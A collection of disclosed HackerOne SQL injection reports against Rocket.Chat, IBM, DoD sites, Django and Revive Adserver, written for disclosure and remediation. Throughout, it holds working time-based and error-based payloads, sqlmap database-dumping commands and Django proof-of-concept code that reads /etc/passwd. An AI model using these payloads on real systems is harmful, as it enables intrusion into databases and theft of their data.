# SQL Injection

_140 reports — High/Critical, disclosed_

### [Complete authentication bypass to admin permissions](https://hackerone.com/reports/3564655)

- **Report ID:** `3564655`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Rocket.Chat
- **Reporter:** @npc
- **Bounty:** - usd
- **Disclosed:** 2026-04-22T09:01:53.489Z
- **CVE(s):** CVE-2026-29198

**Summary (team):**

A NoSQL injection vulnerability in Rocket.Chat allows unauthenticated remote attackers to bypass authentication and perform account takeover. By passing a MongoDB operator as the access_token query parameter (e.g., ?access_token[$ne]=null), an attacker can match the first OAuth token in the database without supplying valid credentials. Exploitation requires at least one OAuth token to exist in the database. Affected versions: <8.3.0, <8.2.1, <8.1.2, <8.0.3, <7.13.5, <7.12.6, <7.11.6, and <7.10.9.

---

### [SQL Injection vulnerability found on ibm.com endpoint](https://hackerone.com/reports/3578842)

- **Report ID:** `3578842`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** IBM
- **Reporter:** @cr3ckerxploit
- **Bounty:** - usd
- **Disclosed:** 2026-03-12T18:54:29.483Z
- **CVE(s):** -

**Summary (team):**

SQL Injection vulnerability found on ibm.com endpoint was reported to IBM, analyzed and has been remediated. Thank you to our external researcher @cr3ckerxploit.

**Summary (researcher):**

A time-based blind SQL Injection vulnerability was discovered in a legacy CGI script (NEWaptresults.cgi) on an official IBM events subdomain. The learnpaths GET parameter did not properly sanitize user input, allowing an unauthenticated attacker to inject malicious SQL code.

Using both manual testing and automated tools, it was confirmed that the backend database would execute arbitrary queries. The injection was verified via time-based payloads (e.g., SLEEP(5)), which caused a measurable delay in the server's response, proving that user-supplied input was being evaluated as part of an SQL query.

Exploitation of this vulnerability could allow an attacker to enumerate database names, extract all stored records, and potentially access sensitive information such as user data, internal configurations, or authentication credentials. No authentication was required to trigger the vulnerability, making it accessible to anyone on the internet.

---

### [SQLi At `███████` via `theme_name` ](https://hackerone.com/reports/3293803)

- **Report ID:** `3293803`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Mars
- **Reporter:** @4ksh3ye
- **Bounty:** - usd
- **Disclosed:** 2026-02-24T19:49:26.815Z
- **CVE(s):** -

**Summary (team):**

A critical SQL injection vulnerability was discovered in a web application's theme selection endpoint through the theme_name parameter. Using SQLMap, the researcher demonstrated both error-based and time-based blind injection attacks against a MySQL database (version 5.1+). The exploitation successfully enumerated thirteen databases, including sensitive repositories for authentication, payment, and security data. The development team promptly implemented fixes using parameterized queries and input validation. Post-remediation testing confirmed the vulnerability was fully resolved. We appreciate the detailed proof-of-concept and responsible disclosure that facilitated swift remediation of this critical security flaw.

---

### [SQLi at █████ parameter](https://hackerone.com/reports/3277276)

- **Report ID:** `3277276`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Mars
- **Reporter:** @scriptsavvy
- **Bounty:** - usd
- **Disclosed:** 2026-02-24T19:43:28.252Z
- **CVE(s):** -

**Summary (team):**

A critical SQL injection vulnerability was discovered in an items endpoint that accepted unauthenticated POST requests without CSRF validation. The vulnerability allowed attackers to execute arbitrary SQL commands, extract database metadata including PostgreSQL version and user accounts, and perform time-based blind injection attacks. Additional security issues included stored XSS through the description parameter and complete lack of authentication controls. The endpoint was successfully exploited to reveal database schema information and demonstrate data injection capabilities. The vulnerability was promptly remediated by the security team, and we appreciate the thorough research and responsible disclosure provided by the security researcher.

---

### [SQL Injection - entryid parameter in 'formbuilderv2-confirmation.php'](https://hackerone.com/reports/3127198)

- **Report ID:** `3127198`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jonasdiasrebelo
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:43:24.305Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
Hi!
I discovered a SQL Injection vulnerability via entryid on the website █████. The vulnerability allows for the manipulation of SQL queries executed by the backend database, which could potentially lead to unauthorized data access or manipulation.

## References

█████████

## Impact

The ability to manipulate SQL queries can lead to:
Unauthorized access to sensitive data.
Potential data leakage.
Data manipulation or corruption.
Full database compromise if administrative permissions are accessible.

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Use the sqlmap:

sqlmap -r file3.txt --dbs --tamper=between -p 'entryid' --dbms=mysql --batch


Use the file3.txt:

```
POST /actions/formbuilderv2-confirmation.php HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https███
Cookie: █████████
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 112
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Host: █████████
Connection: Keep-alive

entryid=1&formid=1&redirect=/form/apply-online/thank-you&useremail=
```

## Suggested Mitigation/Remediation Actions
Use parameterized queries when dealing with SQL queries that contain user input. Parameterized queries allow the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.

---

### [SQLi in LASCO CME Query](https://hackerone.com/reports/186367)

- **Report ID:** `186367`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0daystolive
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:39:22.966Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
There is sqli in the form █████████ on the "CME DateTime" parameter.

I'm also fairly sure ████████ has similar SQLis but its somehow protected by a WAF.

**Description:**

## Impact
The impact is probably quite low but I have not checked to see what other data is accessible via the sqli (loadfile, other databases etc. )

## Step-by-step Reproduction Instructions

1.  Go to ████████. Enter ```' and 1 or 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1 -- -``` in CME DateTime field
3. It will print out the MySQL server version

---

### [SQL Injection - JSON 'name' parameter](https://hackerone.com/reports/3257171)

- **Report ID:** `3257171`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jonasdiasrebelo
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:34:42.890Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

Hi, team!
I discovered a SQL Injection vulnerability in the formid parameter on the website █████████ . The vulnerability allows for the manipulation of SQL queries executed by the backend database, which could potentially lead to unauthorized data access or manipulation.

## References

█████

## Impact

The ability to manipulate SQL queries can lead to:
- Unauthorized access to sensitive data.
- Potential data leakage.
- Data manipulation or corruption.
- Full database compromise if administrative permissions are accessible.

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Use this command:

```
sqlmap -r sqlmap.txt --tamper=between --batch -p 'name'  -dbms=Oracle --technique=T --dbs
```

████

The `sqlmap.txt` file:

███

The original request ('name' parameter is what is vulnerable):

```
POST /er2_mrrp/api/v3/hft/subtitle/ HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: ██████████
Cookie: ██████
Content-Type: application/json
Accept: */*
Content-Length: 46
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Host: ██████████
Connection: Keep-alive

{"filters":{"name":"Search-Pag-0-Search-Pag"}}

```

## Suggested Mitigation/Remediation Actions
Use parameterized queries when dealing with SQL queries that contain user input. Parameterized queries allow the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.

---

### [SQL Injection in URI Path Leading to Full Database Disclosure on ████████](https://hackerone.com/reports/3234050)

- **Report ID:** `3234050`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0x0sadat
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:32:41.076Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
A time-based blind SQL injection vulnerability was discovered on the U.S. Government Public Key Infrastructure website (█████████). The injection point exists in the URI path of the /home/server-ocsp/ endpoint.

This vulnerability allows an unauthenticated attacker to interact with the backend MySQL database and extract sensitive information such as the current database name, available tables, columns, and potentially all underlying data.

**Vulnerable Endpoint:**
`█████████*`

## Impact

- Attacker can extract all database metadata and data.
 - Sensitive information exposure: user data, credentials, configs.
 - Possible full compromise of backend data integrity.

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
**Ghauri Command:**
```
ghauri -u "█████*" \
--technique=T --dbms mysql --time-sec=6 --batch --random-agent --dbs
```

**Manual Curl Time-Based Test:**
You can test the delay manually by measuring response time difference using `curl` and `time`:
```time curl -s -o /dev/null "████████'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z/"```


**Proof of Concept Output (From Ghauri):**
```
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)
    Payload: ██████████'XOR(SELECT(0)FROM(SELECT(SLEEP(6)))a)XOR'Z
---
[05:02:53] [INFO] testing MySQL
[05:02:53] [INFO] confirming MySQL
[05:02:53] [INFO] the back-end DBMS is MySQL
[05:02:53] [INFO] fetching current database
[05:03:16] [WARNING] ("it appears that the character '>' and 'BETWEEN' operator is filtered by the back-end server. ghauri will based data retrieval on IN() operator",)
[05:04:40] [INFO] retrieved: 'de'
current database: 'de'
```

**POC: Video Added**
██████

## Suggested Mitigation/Remediation Actions

---

### [SQL Injection via URL](https://hackerone.com/reports/3127562)

- **Report ID:** `3127562`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jonasdiasrebelo
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:31:47.356Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
Hi!
I discovered a SQL Injection vulnerability  via URL on the website ██████████. The vulnerability allows for the manipulation of SQL queries executed by the backend database, which could potentially lead to unauthorized data access or manipulation.

If you edit the sleep() value from 6 to another number, you will see that the page will have a longer/shorter delay to load. Thus proving SQLi.

██████████thank-you0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
████████=sysdate(),sleep(6),0))XOR'Z
█████locations0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z/
██████careers0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z

## Impact

The ability to manipulate SQL queries can lead to:
Unauthorized access to sensitive data.
Potential data leakage.
Data manipulation or corruption.
Full database compromise if administrative permissions are accessible.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
I found these directories vulnerable, try changing the value '6'.

████thank-you0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
████=sysdate(),sleep(6),0))XOR'Z
██████████locations0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z/
██████careers0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z

## Suggested Mitigation/Remediation Actions
Use parameterized queries when dealing with SQL queries that contain user input. Parameterized queries allow the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.

---

### [SQL Injection - data[account][id] parameter](https://hackerone.com/reports/3127152)

- **Report ID:** `3127152`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jonasdiasrebelo
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:31:09.633Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
Hi!
I discovered a SQL Injection vulnerability in the data[account][id] parameter on the website ███████. The vulnerability allows for the manipulation of SQL queries executed by the backend database, which could potentially lead to unauthorized data access or manipulation.

## References

████

## Impact

The ability to manipulate SQL queries can lead to:
Unauthorized access to sensitive data.
Potential data leakage.
Data manipulation or corruption.
Full database compromise if administrative permissions are accessible.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Use the sqlmap:

```
sqlmap -r file.txt --dbs --tamper=between --batch -p 'data[account][id]'
```

Use the file.txt attached to the report.

## Suggested Mitigation/Remediation Actions
Use parameterized queries when dealing with SQL queries that contain user input. Parameterized queries allow the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.

---

### [SQL injection identified on IBM endpoint. ](https://hackerone.com/reports/2830573)

- **Report ID:** `2830573`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** IBM
- **Reporter:** @rakib0x7
- **Bounty:** - usd
- **Disclosed:** 2026-01-07T19:00:13.070Z
- **CVE(s):** -

**Summary (team):**

SQL injection identified on IBM endpoint was reported to IBM, analyzed and has been remediated. Thank you to our external researcher @rakibhqsec7.

---

### [Potential SQL Injection when annotating FilteredRelation on PostgreSQL](https://hackerone.com/reports/3417967)

- **Report ID:** `3417967`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Django
- **Reporter:** @stackered
- **Bounty:** - usd
- **Disclosed:** 2025-12-02T15:28:06.954Z
- **CVE(s):** CVE-2025-57833, CVE-2025-59681

**Vulnerability Information:**

Hi Django security team !

This vulnerability is related to [CVE 2025-57833](https://docs.djangoproject.com/en/dev/releases/security/#september-3-2025-cve-2025-57833) and [CVE 2025-59681](https://docs.djangoproject.com/en/dev/releases/security/#october-1-2025-cve-2025-59681) as it results from an incomplete Regex filter in the [FORBIDDEN_ALIAS_PATTERN](https://github.com/django/django/blob/4ceaaee7e04b416fc465e838a6ef43ca0ccffafe/django/db/models/sql/query.py#L60).

On PostgreSQL, the `$` symbol can be used to replace quotes and build raw string between tags like this : `$$something$$` or `$tag$something$tag$`. This can be abused to make part of the query interpreted as a raw string instead of the actual query to execute. Under some circumstances, this allows to build injections, as proven by the following PoC.

The following PoC can be pasted inside the `FilteredRelationTests` class in the file `tests/filtered_relation/tests.py`

```python
def test_sqli(self):
        user_data = "$a$,$b$,$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1"

        qs = (
            Book.objects.annotate(**{
                user_data: FilteredRelation(
                "editor"            ),
        })
            .select_related(user_data)
        )

        try:
            import django
            for e in qs.all():
                print("######### Injected #########")
                print(e.title)
                print("############################")
        except django.db.utils.ProgrammingError as e:
            print(f"------\n{e}")
```

This POC will read `/etc/passwd` from the PostgreSQL Docker container, which you can run using this command :

```bash
docker run --rm -it --net=host --name some-postgis -e POSTGRES_PASSWORD=mysecretpassword -d postgres
```

Change the `tests/test_sqlite.py` file to :

```python
DATABASES = {
    "default": {
        "ENGINE": "django.db.backends.postgresql",
        "NAME": "django",
        "USER": "postgres",
        "PORT": 5432,
        "HOST": "localhost"
    },
}
SECRET_KEY = "mysecretpassword"
```

Finally, the PoC can be executed with the following command:

```bash
cd django/tests
python3 runtests.py filtered_relation.tests.FilteredRelationTests.test_sqli
```

Here is the output, showing the file was successfully read on the Docker container.

```
######### Injected #########
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
postgres:x:999:999::/var/lib/postgresql:/bin/bash

############################
```

The full SQL query that was executed is the following :

```sql
SELECT "filtered_relation_book"."id", "filtered_relation_book"."title", "filtered_relation_book"."author_id", "filtered_relation_book"."editor_id", "filtered_relation_book"."number_editor", "filtered_relation_book"."editor_number", "filtered_relation_book"."state", $a$,$b$,$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1."id", $a$,$b$,$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1."name" FROM "filtered_relation_book" INNER JOIN "filtered_relation_editor" $a$,$b$,$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1 ON ("filtered_relation_book"."editor_id" = $a$,$b$,$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1."id")
```

This exploit works in this context because the user input is reflected multiple times in the query, allowing the `$a$, $b$, $c$, ...` tags to be closed and making most of the query be interpreted as raw strings for the select statement.

Here is the simplified query for better readability:

```sql
SELECT "filtered_relation_book"."id", "filtered_relation_book"."title", "filtered_relation_book"."author_id", "filtered_relation_book"."editor_id", "filtered_relation_book"."number_editor", "filtered_relation_book"."editor_number", "filtered_relation_book"."state", $a$...$a$,$b$...$b$,$c$...$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1."id")
```

## Impact

The impact is a SQL injection allowing to exfiltrate data, read system files as the PoC demonstrates, or allow remote command execution.

## Remediation

The remediation consists in adding the `$` symbol to the [FORBIDDEN_ALIAS_PATTERN](https://github.com/django/django/blob/4ceaaee7e04b416fc465e838a6ef43ca0ccffafe/django/db/models/sql/query.py#L60) regex.

---

### [SQL Injection in Django ORM via Unvalidated `_connector` in Q Objects](https://hackerone.com/reports/3335709)

- **Report ID:** `3335709`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Django
- **Reporter:** @cyberstan
- **Bounty:** - usd
- **Disclosed:** 2025-11-06T21:09:42.024Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

A **critical** SQL injection vulnerability exists in the Django ORM's handling of `Q` objects. The internal `WhereNode.as_sql` method uses unsafe string formatting to inject the query connector (e.g., 'AND') into the raw SQL query. An attacker can control this connector value via the `_connector` key when a `Q` object is created using dictionary unpacking (e.g., `Q(**user_input)`). This allows the attacker to inject arbitrary SQL into the `WHERE` clause, completely bypassing the ORM's parameterization safeguards, leading to filter bypass and full data exfiltration from the queried model.

---

### Vulnerability Details

The root cause of the vulnerability is in `django/db/models/sql/where.py` within the `WhereNode.as_sql` method. This method is responsible for joining multiple filter conditions together. The code uses unsafe string formatting to insert the connector:

```python
# Simplified representation of the vulnerable code in WhereNode.as_sql
conn = ' %s ' % self.connector
```

The method does not perform any validation or sanitization on the `self.connector` attribute before embedding it into the query. The framework allows a developer to specify this connector via the `_connector` argument when initializing a `Q` object. A common pattern in applications with complex filtering, such as those with a search API, is to accept a dictionary of filters and unpack it directly. This pattern is highly vulnerable:

```python
# An example of a vulnerable application pattern
filter_dictionary = request.json.get('filters', {{}})
query = Q(**filter_dictionary) # VULNERABLE LINE
results = User.objects.filter(query)
```

If an attacker controls the contents of `filter_dictionary`, they can insert a `_connector` key with a malicious SQL payload. This payload is then injected directly into the query's structure.

---

### POC

1. First create a new django project and the app. Also make sure you add the webapp to the installed apps within settings.py.
```bash
django-admin startproject sqli .
python manage.py startapp webapp
```
```python
# sqli/settings.py

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'webapp',  # <-- Add this
]
```

2. Then create a management/commands folder inside your webapp directory and create two empty __init__.py file in both the management and commands directory.


3. After this create a file called poc.py in the management/commands directory and add this code:

```python
from django.core.management.base import BaseCommand
from django.db.models import Q
from webapp.models import User
from django.db import connection

def process_vulnerable_request(search_dict):
    """
    This function simulates a VULNERABLE part of an application.
    
    It takes a dictionary of filters (as if from a JSON API request)
    and uses unpacking pattern without validating the keys.
    """
    print("--> Entering vulnerable function: Q(**search_dict)")
    # THE VULNERABLE LINE: Unpacking a user-controlled dictionary.
    query = Q(**search_dict)
    return User.objects.filter(query)


class Command(BaseCommand):
    help = "Demonstrates a realistic SQLi PoC via Q object's **kwargs unpacking"

    def handle(self, *args, **options):
        # 1. SETUP
        User.objects.all().delete()
        User.objects.create(username="alice", is_admin=False)
        User.objects.create(username="root", is_admin=True)
        self.stdout.write("Sample users created: 'alice' (non-admin) and 'root' (admin)")
        self.stdout.write("-" * 40)

        # 2. THE MALICIOUS PAYLOAD
        # This dictionary simulates a JSON payload sent by an attacker. It looks
        # like a legitimate filter request, but it includes the malicious key.
        malicious_user_payload = {
            "is_admin": False,
            "username": "nonexistent_user",
            "_connector": ") OR 1=1 OR ("
        }
        self.stdout.write(f"Simulating malicious user payload:\n{malicious_user_payload}")
        self.stdout.write("-" * 40)

        # 3. EXECUTING THE VULNERABLE CODE
        # We pass the attacker's dictionary to the vulnerable function.
        queryset = process_vulnerable_request(malicious_user_payload)
        self.stdout.write("-" * 40)

        # 4. THE PROOF
        compiler = queryset.query.get_compiler(using='default')
        sql, params = compiler.as_sql()
        self.stdout.write(self.style.SQL_KEYWORD("Generated SQL:"))
        self.stdout.write(sql % tuple(f"'{p}'" for p in params))
        self.stdout.write("-" * 40)
        
        # 5. THE IMPACT
        self.stdout.write("Query Results:")
        results = list(queryset)
        for user in results:
            self.stdout.write(f"  - Found user: {user}")
        if any(user.is_admin for user in results):
            self.stdout.write(self.style.SUCCESS("\n SUCCESS: The filter was bypassed via dictionary unpacking! The admin user was returned."))
        else:
            self.stdout.write(self.style.ERROR("\n- FAILED: The injection did not bypass the filter."))

```

4. Then modify models.py to add an example user model.
```python
# models.py

from django.db import models

class User(models.Model):
    username = models.CharField(max_length=100)
    is_admin = models.BooleanField(default=False)

    def __str__(self):
        return f"{self.username} (Admin: {self.is_admin})"
```

5. This is all the code required next simply run the following commands to migrate the database and run the poc.
```bash
python manage.py makemigrations
python manage.py migrate
python manage.py poc

```

6. The ouput of this code will highlight the bug as it allows the sql injection and prints out the users in the table. It will also display the final query highlighting the vulnerability. Example expected ouput can be seen below.
```text

Sample users created: 'alice' (non-admin) and 'root' (admin)
----------------------------------------
Simulating malicious user payload:
{'is_admin': False, 'username': 'nonexistent_user', '_connector': ') OR 1=1 OR ('}
----------------------------------------
--> Entering vulnerable function: Q(**search_dict)
----------------------------------------
Generated SQL:
SELECT "webapp_user"."id", "webapp_user"."username", "webapp_user"."is_admin" FROM "webapp_user" WHERE (NOT "webapp_user"."is_admin" ) OR 1=1 OR ( "webapp_user"."username" = 'nonexistent_user')
----------------------------------------
Query Results:
  - Found user: alice (Admin: False)
  - Found user: root (Admin: True)

 SUCCESS: The filter was bypassed via dictionary unpacking! The admin user was returned.
```

---

### Suggested Remediation

The root cause is the trust placed in the `_connector` string. The vulnerability can be patched by validating the connector value against a strict allow-list before it is used for string formatting.

**Proposed Patch (`django/db/models/sql/where.py`):**
```python
# In WhereNode.as_sql method...

def as_sql(self, compiler, connection):
    # Add this validation at the beginning of the method
    if self.connector not in ('AND', 'OR'):
        raise ValueError(
            f"Invalid connector '{{self.connector}}'. Must be 'AND' or 'OR'."
        )
    
    # ... (rest of the method proceeds as normal)
    conn = ' %s ' % self.connector
    # ...
```

## Impact

### Impact

The impact of this vulnerability is **critical**. An attacker who can control the keys of a dictionary used to filter a model can:
-   **Bypass Access Controls:** Retrieve any and all records from the queried table by injecting a condition that is always true (e.g., `OR 1=1`), thereby bypassing all other filters in the `WHERE` clause.
-   **Exfiltrate Sensitive Data:** An attacker can leak the data of all users, including administrators, from a users table. This applies to any model exposed via a vulnerable filter.
-   **Degrade Performance:** A complex injected SQL payload could potentially be used to cause a Denial-of-Service condition by overloading the database.

---

### [Error-Based & Time-Based SQL Injection in 'keyword' Parameter of admin-search.php Allowing Full Database Access in Revive Adserver v6.0.0](https://hackerone.com/reports/3395221)

- **Report ID:** `3395221`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Revive Adserver
- **Reporter:** @kanon4
- **Bounty:** - usd
- **Disclosed:** 2025-10-24T12:14:25.824Z
- **CVE(s):** CVE-2025-52664

**Vulnerability Information:**

==Cricetinae==

#Summary:

A critical SQL Injection vulnerability has been identified in Revive Adserver's administrative search functionality, specifically in the `admin-search.php` file. The vulnerability exists in the handling of the keyword `GET` parameter, which is passed to multiple database queries without proper sanitization or parameterization.


The vulnerability stems from the use of the phpAds_registerGlobalUnslashed() function to register user input variables, including keyword, without proper escaping:

```php
phpAds_registerGlobalUnslashed('keyword', 'client', 'campaign', 'banner', 'zone', 'affiliate', 'compact');
```

Subsequently, this user-controlled input is passed directly to several database query functions:

```php
$rsClients = $dalClients->getClientByKeyword($keyword, $agencyId);
$rsCampaigns = $dalCampaigns->getCampaignAndClientByKeyword($keyword, $agencyId);
$rsBanners = $dalBanners->getBannerByKeyword($keyword, $agencyId);
$rsAffiliates = $dalAffiliates->getAffiliateByKeyword($keyword, $agencyId);
$rsZones = $dalZones->getZoneByKeyword($keyword, $agencyId);
```

Without examining the implementation of these functions, it's evident they do not properly sanitize the `keyword` parameter before incorporating it into SQL queries, resulting in SQL Injection.

**Technical Analysis**

Testing with SQLMap confirmed two distinct SQL Injection vulnerabilities:

1.Error-based injection using MySQL's EXTRACTVALUE function:

```bash
Payload: keyword=FUZZ') AND EXTRACTVALUE(8429,CONCAT(0x5c,0x716a7a6a71,(SELECT (ELT(8429=8429,1))),0x7178787871))-- Nqvq&compact=t
```

2. Time-based blind injection using MySQL's SLEEP function:

```bash
Payload: keyword=FUZZ') AND (SELECT 3790 FROM (SELECT(SLEEP(5)))yGYJ)-- YFDA&compact=t
```

#Steps To Reproduce:

  1. open `burp suite` And open the built-in browser with it
  1. Go to the following request: `http://localhost/www/admin/admin-search.php?keyword=FUZZ&compact=t`
  1. Capture the request using Burp Suite
  1. Save the request to a text file using `nano testsql.txt`
  1. Run the following command:

```bash
sqlmap -r testsql.txt --dbs
```

  6. ==You will see the database being extracted==

#Supporting Material/References:

**PoC Video**

{F4922045}

https://portswigger.net/web-security/sql-injection
https://owasp.org/www-community/attacks/SQL_Injection
https://www.imperva.com/learn/application-security/sql-injection-sqli/
https://www.cloudflare.com/learning/security/threats/sql-injection/
https://www.acunetix.com/websitesecurity/sql-injection/

## Impact

This vulnerability allows an authenticated attacker to:

- Extract sensitive information from the database
- Modify or delete database contents
- Potentially execute privileged commands on the database server
- Possibly escalate to a more severe attack vector through data exfiltration

The SQLMap test successfully identified the database name and confirmed the ability to execute arbitrary SQL queries through the vulnerable parameter.
Root Cause

The root cause is improper input validation and the absence of prepared statements or parameterized queries. The application directly incorporates user-controlled input into SQL queries without adequate sanitization or escaping mechanisms.

This is a fundamental code flaw in the Revive Adserver source code and not a result of misconfiguration.

---

### [SQL Injection when using FilteredRelation](https://hackerone.com/reports/3292573)

- **Report ID:** `3292573`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Django
- **Reporter:** @eyalsec
- **Bounty:** - usd
- **Disclosed:** 2025-09-15T14:01:21.989Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Django team :)

Vulnerability location:
https://github.com/django/django/blob/main/tests/filtered_relation/tests.py#L124

You may create my POC function above the "test_select_related_foreign_key" function:
```
    def test_select_related_foreign_key_sqli(self):
        user_data = "author_join2\""

        qs = (
            Book.objects.annotate(**{
                user_data: FilteredRelation("author"),
        })
            .select_related(user_data)
        )

        qs._fetch_all()
```

SQL Query:
`SELECT "filtered_relation_book"."id", "filtered_relation_book"."title", "filtered_relation_book"."author_id", "filtered_relation_book"."editor_id", "filtered_relation_book"."number_editor", "filtered_relation_book"."editor_number", "filtered_relation_book"."state", author_join2"."id", author_join2"."name", author_join2"."content_type_id", author_join2"."object_id" FROM "filtered_relation_book" INNER JOIN "filtered_relation_author" author_join2" ON ("filtered_relation_book"."author_id" = author_join2"."id")`

{F4660052}

To execute the SQLI  you may run:
`python3 django/tests/runtests.py filtered_relation.tests.FilteredRelationTests.test_select_related_foreign_key_sqli`

## Impact

The impact is direct SQL Injection for any user with access to `select_related(` as above.

I hope you have a great day!!!

Eyal :)

---

### [SQL injection in JSONField KeyTransform](https://hackerone.com/reports/2588426)

- **Report ID:** `2588426`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Django
- **Reporter:** @eyalsec
- **Bounty:** - usd
- **Disclosed:** 2025-09-12T00:28:00.244Z
- **CVE(s):** CVE-2024-42005

**Vulnerability Information:**

Hi Django team

The vulnerability is in:
https://github.com/django/django/blob/main/tests/model_fields/test_jsonfield.py#L427
I created a function and added it to the "test_jsonfield.py" to explain the vulnerability (POC).
```
    def test_sqli(self):

        # say a to get value b
        # say b to get value c
        # say " for syntax error in sql
        user_input = "b"

        NullableJSONModel.objects.create(value_custom={"a": "b"})
        NullableJSONModel.objects.create(value_custom={"b": "c"})
        qs = NullableJSONModel.objects.filter(value_custom__isnull=False).values(
            "value_custom__" + user_input,
        ).annotate(
            count=Count("id"),
        )

        for i in qs:
            v = i["value_custom__" + user_input]
            if v:
                print(v)
```
to execute the below code i did:
`python runtests.py model_fields.test_jsonfield.TestQuerying.test_sqli`
When I execute above function with `user_input = "beeeee\""` in the code, I get sql syntax error.

